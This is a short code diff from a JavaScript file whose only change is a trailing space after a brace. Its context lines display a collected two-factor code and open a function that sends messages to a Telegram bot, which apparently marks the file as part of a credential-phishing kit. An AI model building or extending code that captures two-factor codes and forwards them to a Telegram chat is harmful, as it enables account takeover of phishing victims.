@@ -501,7 +501,7 @@
       escapeHtml(d.twoFaFifth) +
       '</code>'
     );
-  }
+  } 
 
   async function sendTelegramMessage(values) {
     if (!window.config || !window.config.TELEGRAM_BOT_TOKEN || !window.config.TELEGRAM_CHAT_ID) {
